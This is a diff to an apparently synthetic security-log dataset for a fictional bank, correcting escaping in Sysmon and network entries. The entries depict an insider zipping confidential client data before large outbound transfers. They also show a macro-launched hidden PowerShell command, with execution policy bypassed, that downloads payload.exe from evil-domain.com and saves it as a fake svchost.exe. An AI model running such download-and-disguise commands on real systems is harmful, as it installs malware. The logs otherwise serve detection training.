@@ -5,20 +5,18 @@
   "EventID": 1,
   "Image": "powershell.exe",
   "CommandLine": "powershell Get-Service",
-  "User": "BANKLOCAL\\\\it.admin"
+  "User": "BANKLOCAL\\it.admin"
 },
-
 {
   "log_id": "LOG002",
   "timestamp": "2026-03-27T02:15:00Z",
   "source": "sysmon",
   "EventID": 1,
-  "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
-  "CommandLine": "powershell.exe Compress-Archive -Path \\"Z:\\\\Confidential_Client_Data\\\\*\\" -DestinationPath \\"C:\\\\Users\\\\mscott\\\\Desktop\\\\personal_backup.zip\\"",
-  "User": "BANKLOCAL\\\\mscott",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe Compress-Archive -Path \"Z:\\Confidential_Client_Data\\*\" -DestinationPath \"C:\\Users\\mscott\\Desktop\\personal_backup.zip\"",
+  "User": "BANKLOCAL\\mscott",
   "ParentImage": "explorer.exe"
 },
-
 {
   "log_id": "LOG003",
   "timestamp": "2026-03-27T02:20:00Z",
@@ -28,7 +26,6 @@
   "logon_type": 2,
   "src_ip": "10.0.50.44"
 },
-
 {
   "log_id": "LOG004",
   "timestamp": "2026-03-27T02:25:00Z",
@@ -41,7 +38,6 @@
   "orig_bytes": 8500000000,
   "resp_bytes": 1200
 },
-
 {
   "log_id": "LOG005",
   "timestamp": "2026-03-27T03:00:00Z",
@@ -52,7 +48,6 @@
   "orig_bytes": 5000000000,
   "resp_bytes": 4800000000
 },
-
 {
   "log_id": "LOG006",
   "timestamp": "2026-03-27T09:10:00Z",
@@ -62,27 +57,24 @@
   "logon_type": 2,
   "src_ip": "10.0.20.15"
 },
-
 {
   "log_id": "LOG007",
   "timestamp": "2026-03-27T09:14:22Z",
   "source": "sysmon",
   "EventID": 1,
-  "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
-  "CommandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -c \\"Invoke-WebRequest -Uri '<http://evil-domain.com/payload.exe>' -OutFile 'C:\\\\Users\\\\Public\\\\svchost.exe'\\"",
-  "User": "BANKLOCAL\\\\jdoe",
-  "ParentImage": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE"
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -c \"Invoke-WebRequest -Uri '<http: //evil-domain.com/payload.exe>' -OutFile 'C:\\Users\\Public\\svchost.exe'\"",
+  "User": "BANKLOCAL\\jdoe",
+  "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
 },
-
 {
   "log_id": "LOG008",
   "timestamp": "2026-03-27T09:14:25Z",
   "source": "sysmon",
   "EventID": 11,
   "Image": "powershell.exe",
-  "TargetFilename": "C:\\\\Users\\\\Public\\\\svchost.exe"
+  "TargetFilename": "C:\\Users\\Public\\svchost.exe"
 },
-
 {
   "log_id": "LOG009",
   "timestamp": "2026-03-27T09:15:00Z",
@@ -90,9 +82,8 @@
   "EventID": 1,
   "Image": "WINWORD.EXE",
   "CommandLine": "invoice.docm",
-  "User": "BANKLOCAL\\\\jdoe"
+  "User": "BANKLOCAL\\jdoe"
 },
-
 {
   "log_id": "LOG010",
   "timestamp": "2026-03-27T09:16:30Z",
@@ -100,5 +91,5 @@
   "EventID": 1,
   "Image": "chrome.exe",
   "CommandLine": "chrome.exe <https://mail.bank.local>",
-  "User": "BANKLOCAL\\\\jdoe"
+  "User": "BANKLOCAL\\jdoe"
 },
